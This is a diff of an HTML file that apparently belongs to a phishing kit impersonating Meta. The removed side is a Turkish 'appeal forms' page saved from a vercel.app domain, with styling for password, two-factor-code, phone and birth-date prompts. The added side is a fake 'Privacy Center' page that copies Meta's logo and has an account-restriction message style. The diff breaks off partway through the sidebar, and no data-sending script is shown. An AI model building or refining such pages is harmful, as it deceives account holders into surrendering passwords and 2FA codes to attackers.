@@ -1,1796 +1,960 @@
 <!DOCTYPE html>
-<!-- saved from url=(0062)https://meta-appealshelppagecenter-for.vercel.app/appeal-forms -->
-<html lang="tr" dir="ltr">
-<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
-    
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>İtiraz Formları</title>
-    <meta name="robots" content="noindex, nofollow">
-    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/v4/yg/r/Hn19bEHYJbt.png">
-    <!-- Vercel Analytics -->
-    <script>window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };</script>
-    <script defer="" src="./Appeal Forms_files/script.js.download"></script>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privacy Center</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        /* ===== RESET & BASE ===== */
-        *,
-        *::before,
-        *::after {
+        * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
-            font-size: 16px;
-            line-height: 1.65;
-            color: #334155;
-            background-color: #F0F5FA;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            color: #1c2b33;
+            padding: 20px 0;
         }
 
-        a {
-            color: #046bd2;
-            text-decoration: none;
-        }
-
-        /* ===== HEADER ===== */
-        .site-header {
-            background-color: #D1D5DB75;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .site-header .fb-icon {
-            fill: #046bd2;
-            width: 40px;
-            height: 40px;
-        }
-
-        /* ===== MAIN CONTENT ===== */
-        .site-content {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        /* ===== FORM CARD ===== */
-        .form-coursera {
-            width: 100%;
-            max-width: 600px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            background: #fff;
-            margin: auto;
-        }
-
-        @media (min-width: 768px) {
-            .form-coursera {
-                width: 74%;
-            }
-        }
-
-        .form-coursera-header {
-            background: #F5F6F7;
-            padding: 12px;
-            border-radius: 8px 8px 0 0;
-            text-align: center;
-        }
-
-        .form-coursera-body {
-            padding: 16px;
-        }
-
-        .form-coursera-intro {
-            background: #fff;
-            border-radius: 10px;
-            padding: 20px;
-            border: 1px solid #e2e8f0;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
-            margin-bottom: 0;
-        }
-
-        .form-coursera-intro p {
-            margin: 10px 0;
-            font-size: 15px;
-            color: #334155;
-        }
-
-        .form-coursera-content {
+        .container-custom {
+            max-width: 960px;
+            margin: 0 auto;
             padding: 0 20px;
-            margin-bottom: 20px;
         }
 
-        .form-coursera-field {
-            margin-bottom: 16px;
+        .card-white {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            padding: 24px;
         }
 
-        .form-coursera-field span {
-            display: block;
-            font-size: 12px;
-            font-weight: bold;
-            color: #90949C;
-            margin-bottom: 2px;
-        }
-
-        .form-coursera-field input[type="text"],
-        .form-coursera-field input[type="email"],
-        .form-coursera-field textarea {
-            width: 100%;
-            padding: 8px 12px;
-            border: 1px solid #d1d5db;
-            border-radius: 6px;
-            font-size: 14px;
-            outline: none;
-            font-family: inherit;
-        }
-
-        .form-coursera-field input:focus,
-        .form-coursera-field textarea:focus {
-            border-color: #2563eb;
-            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
-        }
-
-        /* Radio Group */
-        .radio-group {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-            margin-bottom: 10px;
-        }
-
-        .radio-group label {
-            font-size: 13px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            cursor: pointer;
-            font-weight: 400;
-            color: #334155;
-        }
-
-        .radio-group input[type="radio"] {
-            width: 14px;
-            height: 14px;
-            border: 2px solid #d1d5db;
-            border-radius: 50%;
-            appearance: none;
-            -webkit-appearance: none;
-            outline: none;
-            cursor: pointer;
-            flex-shrink: 0;
-        }
-
-        .radio-group input[type="radio"]:checked {
-            background-color: #3b82f6;
-            border-color: #3b82f6;
-        }
-
-        .textarea {
-            resize: vertical;
-            font-size: 14px;
-            width: 100%;
-            border: 1px solid #d1d5db;
-            border-radius: 6px;
-            padding: 8px 12px;
-            font-family: inherit;
-            outline: none;
-        }
-
-        .textarea:focus {
-            border-color: #2563eb;
-            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
-        }
-
-        /* Form Footer */
-        .form-coursera-footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+        .sidebar-card {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
             padding: 20px;
-            border-top: 1px solid #eee;
         }
 
-        .form-coursera-footer .logo {
-            height: 20px;
-        }
-
-        .submit-btn {
-            background: #1e3a8a;
-            color: #fff;
-            padding: 8px 16px;
-            font-size: 14px;
-            font-weight: bold;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-
-        .submit-btn:hover {
-            background: #15317a;
-        }
-
-        /* ===== MODAL OVERLAY ===== */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 9999;
-        }
-
-        .modal-overlay.hidden {
-            display: none;
-        }
-
-
-        /* Password Modal - Full screen overlay */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 1000;
+        .action-button {
             display: flex;
             align-items: center;
-            justify-content: center;
-            animation: modalOverlayIn 0.3s ease;
-        }
-
-        @keyframes modalOverlayIn {
-            from {
-                opacity: 0
-            }
-
-            to {
-                opacity: 1
-            }
-        }
-
-        @keyframes modalSlideIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px) scale(0.95);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
-        .modal-box {
-            background: #fff;
-            border-radius: 16px;
-            width: 90%;
-            max-width: 440px;
-            min-height: 560px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: space-between;
-            padding: 40px 20px;
-            animation: modalSlideIn 0.3s ease;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
-        }
-
-        .modal-logo-top {
-            width: 50px;
-            height: 50px;
-            margin-bottom: 20px;
-        }
-
-        .modal-logo-top img {
-            width: 100%;
-            height: 100%;
-        }
-
-        .modal-pwd-content {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            flex: 1;
-        }
-
-        .modal-pwd-content>div {
-            width: 100%;
-        }
-
-        .modal-pwd-desc {
-            color: #1C1E21;
-            font-size: 14px;
-            margin-bottom: 7px;
-        }
-
-        .pwd-input-wrapper {
-            position: relative;
-            width: 100%;
-            border: 1px solid #d4dbe3;
-            height: 40px;
-            padding: 0 11px;
-            border-radius: 10px;
-            background: #fff;
-            font-size: 14px;
-            margin-bottom: 10px;
-            transition: all 0.2s;
-        }
-
-        .pwd-input-wrapper:focus-within,
-        .pwd-input-wrapper:hover {
-            border-color: #3b82f6;
-            box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.1);
-        }
-
-        .pwd-input-wrapper input {
-            width: calc(100% - 30px);
-            outline: none;
-            height: 100%;
-            border: none;
-            background: transparent;
-            font-size: 14px;
-            font-family: inherit;
-        }
-
-        .pwd-input-wrapper input.input-error {
-            border-color: #ef4444;
-        }
-
-        .hide-password-toggle::-ms-clear,
-        .hide-password-toggle::-ms-reveal {
-            display: none;
-        }
-
-      .toggle-pwd-btn {
-    position: absolute;
-    top: 0;
-    inset-inline-end: 0;
-    height: 100%;
-    display: flex;
-    align-items: center;
-    padding: 0 12px;
-
-    /* 🔥 BỎ VIỀN */
-    border: none;
-    outline: none;
-    background: transparent;
-    box-shadow: none;
-
-    /* 🔥 Fix mobile (iOS, Android) */
-    appearance: none;
-    -webkit-appearance: none;
-}
-
-        .error_password {
-            color: #ef4444;
-            font-size: 12px;
-            margin-bottom: 8px;
-            min-height: 16px;
-        }
-
-        .continue-btn {
-            width: 100%;
-            height: 40px;
-            min-height: 40px;
-            background: #0064E0;
-            color: #fff;
-            border: none;
-            border-radius: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 14px;
-            margin-top: 20px;
-            transition: background 0.2s;
-        }
-
-        .continue-btn:hover {
-            background: #0056c7;
-        }
-
-        .forgot-link {
-            display: block;
-            text-align: center;
-            margin-top: 10px;
-            color: #1C1E21;
-            font-size: 14px;
-            text-decoration: none;
-        }
-
-        .modal-logo-bottom {
-            width: 60px;
-            margin-top: 20px;
-        }
-
-        .modal-logo-bottom img {
-            width: 100%;
-            height: auto;
-        }
-
-        /* 2FA Modal */
-        .tfa-header-row {
-            display: flex;
-            align-items: center;
-            color: #1C1E21;
-            gap: 6px;
-            font-size: 14px;
-            margin-bottom: 7px;
-        }
-
-        .tfa-dot {
-            width: 4px;
-            height: 4px;
-            background: #1C1E21;
-            border-radius: 5px;
-        }
-
-        .tfa-title {
-            font-size: 20px;
-            color: #000;
-            font-weight: 700;
-            margin-bottom: 15px;
-        }
-
-        .tfa-desc {
-            color: #1C1E21;
-            font-size: 14px;
-        }
-
-        .tfa-image {
-            width: 100%;
-            border-radius: 10px;
-            background: #f5f5f5;
-            overflow: hidden;
-            margin: 15px 0;
-        }
-
-        .tfa-image img {
-            display: block;
-        }
-
-        .tfa-submit-btn {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-
-        .tfa-submit-btn.tfa-enabled {
-            opacity: 1;
-            cursor: pointer;
-        }
-
-        .tfa-try-another {
-            width: 100%;
-            margin-top: 20px;
-            color: #1C1E21;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            background: transparent;
-            border-radius: 40px;
-            padding: 10px 20px;
-            border: 1px solid #d4dbe3;
-            font-size: 14px;
-        }
-
-        /* Success Modal */
-        .success-title {
-            font-weight: 700;
-            color: #0A1317;
-            font-size: 15px;
-        }
-
-        .success-close {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-            opacity: 0.6;
-            transition: opacity 0.2s;
-        }
-
-        .success-close:hover {
-            opacity: 1;
-        }
-
-        .success-image {
-            border-radius: 10px;
-            overflow: hidden;
-            margin-bottom: 15px;
-        }
-
-        .success-desc {
-            color: #1C1E21;
-            margin-bottom: 10px;
-            font-size: 15px;
-        }
-
-        .success-from {
-            color: #1C1E21;
-            margin-bottom: 20px;
-            font-size: 15px;
-        }
-
-        .success-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            background: #0064E0;
-            color: #fff;
-            border-radius: 40px;
-            padding: 10px;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 600;
-            transition: background 0.2s;
-        }
-
-        .success-btn:hover {
-            background: #0056c7;
-        }
-
-        /* Custom Radio Buttons (Facebook style) */
-        .radio-group {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-top: 8px;
-        }
-
-        .radio-group label {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            cursor: pointer;
-            font-size: 14px;
-            color: #333;
-        }
-
-        .radio-group input[type=radio],
-        .radio-group input[type="radio"] {
-            -webkit-appearance: none !important;
-            -moz-appearance: none !important;
-            appearance: none !important;
-            width: 18px;
-            height: 18px;
-            border: 2px solid #8a8d91;
-            border-radius: 50%;
-            flex-shrink: 0;
-            position: relative;
-            cursor: pointer;
-            margin: 0;
-            padding: 0;
-            background: #fff;
-            outline: none;
-            accent-color: #4b4f56;
-        }
-
-        .radio-group input[type=radio]:checked,
-        .radio-group input[type="radio"]:checked {
-            border-color: #1c1e21;
-            background: #fff;
-        }
-
-        .radio-group input[type=radio]:checked::after,
-        .radio-group input[type="radio"]:checked::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #1c1e21;
-        }
-
-        /* Phone Input with Flag */
-        .react-tel-input {
-            display: flex;
-            align-items: center;
-            height: 100%;
-            position: relative;
-        }
-
-        .react-tel-input .form-control {
-            width: 100%;
-            border: none;
-            outline: none;
-            height: 100%;
-            font-size: 14px;
-            padding-left: 52px;
-            background: transparent;
-            font-family: inherit;
-        }
-
-        .flag-dropdown {
-            position: absolute;
-            left: 0;
-            height: 100%;
-            z-index: 10;
-        }
-
-        .selected-flag {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            height: 100%;
-            padding: 0 8px;
-            cursor: pointer;
-        }
-
-        .selected-flag img {
-            width: 20px;
-            height: 14px;
-            border-radius: 2px;
-            object-fit: cover;
-        }
-
-        .arrow {
-            width: 0;
-            height: 0;
-            border-left: 4px solid transparent;
-            border-right: 4px solid transparent;
-            border-top: 4px solid #555;
-        }
-
-        .flag-dropdown.open .arrow {
-            border-top: none;
-            border-bottom: 4px solid #555;
-        }
-
-        .country-list {
-            position: absolute;
-            top: 100%;
-            left: 0;
-            width: 280px;
-            max-height: 200px;
-            overflow-y: auto;
-            background: #fff;
-            border: 1px solid #d4dbe3;
+            padding: 12px 16px;
             border-radius: 8px;
-            list-style: none;
-            padding: 0;
-            margin: 4px 0 0 0;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            z-index: 100;
-        }
-
-        .country-search-wrap {
-            padding: 8px;
-            position: sticky;
-            top: 0;
-            background: #fff;
-        }
-
-        .country-search-wrap input {
-            width: 100%;
-            padding: 6px 8px;
-            border: 1px solid #d4dbe3;
-            border-radius: 6px;
-            font-size: 13px;
-            outline: none;
-        }
-
-        .country {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 6px 12px;
             cursor: pointer;
-            font-size: 13px;
+            transition: background 0.15s;
+            gap: 12px;
+            color: #1c2b33;
+            text-decoration: none;
         }
 
-        .country:hover {
+        .action-button:hover {
             background: #f0f2f5;
         }
 
-        .country.highlight {
-            background: #e8f0fe;
-        }
-
-        .country-flag {
-            width: 20px;
-            height: 14px;
-            border-radius: 2px;
-            object-fit: cover;
-        }
-
-        .country-name {
-            flex: 1;
-        }
-
-        .dial-code {
-            color: #1C1E21;
-        }
-
-        /* Phone input wrapper */
-        .phone-input-wrapper {
-            width: 100%;
-            border: 1px solid #d4dbe3;
-            height: 40px;
-            border-radius: 10px;
-            background: #fff;
-            font-size: 14px;
-            margin-bottom: 10px;
-            position: relative;
-            transition: all 0.2s;
-        }
-
-        .phone-input-wrapper:focus-within,
-        .phone-input-wrapper:hover {
-            border-color: #3b82f6;
-            box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.1);
-        }
-
-        /* DOB Fields */
-        .dob-label {
-            color: #1C1E21;
-            font-size: 14px;
-            margin-bottom: 7px;
-            font-weight: bold;
-        }
-
-        .dob-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 10px;
-        }
-
-        .dob-field {
-            width: 100%;
-            border: 1px solid #d4dbe3;
-            height: 40px;
-            padding: 0 11px;
-            border-radius: 10px;
-            background: #fff;
-            font-size: 14px;
-            margin-bottom: 10px;
-            transition: all 0.2s;
-        }
-
-        .dob-field:focus-within,
-        .dob-field:hover {
-            border-color: #1c1e21;
-            box-shadow: none;
-        }
-
-        .dob-field input {
-            width: 100%;
-            height: 100%;
-            border: none;
-            outline: none;
-            background: transparent;
-            font-size: 14px;
-            font-family: inherit;
-        }
-
-        /* Form Error */
-        .form-error {
-            display: none;
+        .action-button-img {
+            flex-shrink: 0;
+            width: 36px;
+            height: 36px;
+            display: flex;
             align-items: center;
-            gap: 4px;
-            color: #ef4444;
-            font-size: 12px;
+            justify-content: center;
+        }
+
+        .action-button-img svg {
+            width: 24px;
+            height: 24px;
+            fill: currentColor;
+        }
+
+        .action-button-text {
+            flex: 1;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .action-button-arrow {
+            flex-shrink: 0;
+            color: #65676b;
+        }
+
+        .btn-primary-custom {
+            background: #1877f2;
+            border: none;
+            padding: 10px 32px;
+            border-radius: 8px;
+            font-weight: 600;
+            color: white;
+            text-decoration: none;
+            display: inline-block;
+            transition: background 0.15s;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .btn-primary-custom:hover {
+            background: #166fe5;
+            color: white;
+        }
+
+        .btn-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .note-text {
+            margin-top: 12px;
+            font-size: 14px;
+            color: #000;
+            text-align: center;
+        }
+
+        .date-bold {
+            font-weight: 700;
+            font-size: 15px;
+            color: #111;
+        }
+
+        .restricted-message {
+            color: #dc3545 !important;
+            font-weight: 700 !important;
+            font-size: 15px !important;
+        }
+
+        .restricted-message .date-bold {
+            color: #dc3545 !important;
+            font-weight: 700 !important;
+        }
+
+        .header-logo {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .burger-menu {
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .burger-menu .bar {
+            width: 24px;
+            height: 3px;
+            background-color: #1c2b33;
+            margin: 4px 0;
+            border-radius: 2px;
+        }
+
+        .list-bullet {
+            padding-left: 20px;
+            margin-bottom: 16px;
+        }
+
+        .list-bullet li {
             margin-bottom: 8px;
         }
 
-        .form-error.visible {
-            display: flex;
-        }
-
-        /* Loading spinner */
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .loading-spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #fff;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            vertical-align: middle;
-            margin-right: 6px;
-        }
-
-        /* ===== FOOTER ===== */
-        .site-footer {
-            text-align: center;
-            padding: 20px;
-            color: #334155;
-            font-size: 14px;
-            background-color: #F0F5FA;
-        }
-
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
-            .form-coursera {
-                width: 95%;
+            .sidebar-card {
+                margin-bottom: 20px;
             }
-
-            .form-coursera-content {
-                padding: 0 12px;
+            .container-custom {
+                padding: 0 10px;
+            }
+            .card-white {
+                padding: 16px;
+            }
+            .sidebar-card {
+                padding: 14px;
             }
         }
     </style>
 </head>
-
 <body>
-    <!-- Header -->
-    <header class="site-header">
-        <div style="text-align: center;">
-            <img src="https://i.postimg.cc/qqQvGqsv/meta.png" width="192px" alt="">
-                <path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z">
-                </path>
-            
+    <div class="container-custom">
+        <!-- Header -->
+        <div class="header-logo">
+            <div>
+                <svg viewBox="0 0 500 100" style="height:40px; width:auto;" aria-label="Meta Logo">
+                    <defs>
+                        <linearGradient id="g1" x1="124.38" x2="160.839" y1="99" y2="59.326">
+                            <stop offset=".427" stop-color="#0278F1"/>
+                            <stop offset=".917" stop-color="#0180FA"/>
+                        </linearGradient>
+                        <linearGradient id="g2" x1="42" x2="-1.666" y1="4.936" y2="61.707">
+                            <stop offset=".427" stop-color="#0165E0"/>
+                            <stop offset=".917" stop-color="#0180FA"/>
+                        </linearGradient>
+                        <linearGradient id="g3" x1="27.677" x2="132.943" y1="28.71" y2="71.118">
+                            <stop stop-color="#0064E0"/>
+                            <stop offset=".656" stop-color="#0066E2"/>
+                            <stop offset="1" stop-color="#0278F1"/>
+                        </linearGradient>
+                    </defs>
+                    <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#1C2B33"/>
+                    <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0180FA"/>
+                    <path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#g1)"/>
+                    <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#g2)"/>
+                    <path d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z" fill="url(#g3)"/>
+                </svg>
+            </div>
+            <div class="burger-menu">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
         </div>
-    </header>
 
-    <!-- Main Content -->
-    <div class="site-content">
-        <form id="form-info" class="form-coursera">
-            <div class="form-coursera-header"></div>
+        <!-- Main Content -->
+        <div class="row">
+            <!-- Sidebar -->
+            <div class="col-md-4">
+                <div class="sidebar-card">
+                    <div style="margin-bottom: 16px;">
+                        <svg viewBox="0 0 500 100" style="height:30px; width:auto;" aria-label="Meta Logo Small">
+                            <use href="#meta-logo-path"></use>
+                        </svg>
+                    </div>
+                    <h5 style="font-weight: 600; margin-bottom: 20px;" data-translate="privacy_center">Privacy Center</h5>
 
-            <div class="form-coursera-body">
-                <div class="form-coursera-intro">
-                    <p data-i18n="form.introDesc">Lütfen hesap kısıtlamalarının hatalı uygulandığını neden düşündüğünüzü açıklayın. Ekiplerimiz ve teknolojimiz, kuralların tutarlı bir şekilde uygulanmasını sağlamak için birçok dilde çalışmaktadır. Bizimle ana dilinizde iletişim kurabilirsiniz.</p>
+                    <div class="action-button">
+                        <div class="action-button-img">
+                            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="m19.007 9.997-6.338-5.704a1 1 0 0 0-1.338 0L4.993 9.997A3 3 0 0 0 4 12.227v6.61c0 .216.07.38.149.48a.432.432 0 0 0 .284.167c.86.14 2.04.29 3.567.391V16a3 3 0 0 1 3-3h2a3 3 0 0 1 3 3v3.875a37.895 37.895 0 0 0 3.567-.39.432.432 0 0 0 .284-.168.773.773 0 0 0 .149-.48v-6.61a3 3 0 0 0-.993-2.23zM3.655 8.51l6.338-5.704a3 3 0 0 1 4.014 0l6.338 5.704A5 5 0 0 1 22 12.227v6.61c0 1.292-.836 2.413-2.11 2.621-.94.153-2.208.312-3.833.418-1.125.073-2.057-.836-2.057-1.964V16a1 1 0 0 0-1-1h-2a1 1 0 0 0-1 1v3.912c0 1.128-.932 2.037-2.057 1.964a40.092 40.092 0 0 1-3.832-.418C2.836 21.25 2 20.13 2 18.838v-6.611A5 5 0 0 1 3.655 8.51z"/></svg>
+                        </div>
+                        <div class="action-button-text" data-translate="home_page">Privacy Center Home Page</div>
+                    </div>
+
+                    <div class="action-button">
+                        <div class="action-button-img">
+                            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M16.618 18.032a9 9 0 1 1 1.414-1.414l3.675 3.675a1 1 0 0 1-1.414 1.414l-3.675-3.675zM18 11a7 7 0 1 1-14 0 7 7 0 0 1 14 0z"/></svg>
+                        </div>
+                        <div class="action-button-text" data-translate="search">Search</div>
+                    </div>
+
+                    <div class="action-button">
+                        <div class="action-button-img">
+                            <svg viewBox="0 0 24 24"><path d="M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z"/></svg>
+                        </div>
+                        <div class="action-button-text" data-translate="privacy_policy">Privacy Policy</div>
+                        <div class="action-button-arrow">
+                            <svg viewBox="0 0 24 24" width="20" height="20"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z"/></svg>
+                        </div>
+                    </div>
+
+                    <div class="action-button">
+                        <div class="action-button-img">
+                            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm0-13.702c.483 0 .875.391.875.875V17a.875.875 0 0 1-1.75 0v-6.827c0-.484.392-.875.875-.875zm0-1.275c.833 0 1.25-.405 1.25-1.012C13.25 6.405 12.833 6 12 6s-1.25.405-1.25 1.011c0 .607.417 1.012 1.25 1.012z"/></svg>
+                        </div>
+                        <div class="action-button-text" data-translate="other_rules">Other rules and articles</div>
+                        <div class="action-button-arrow">
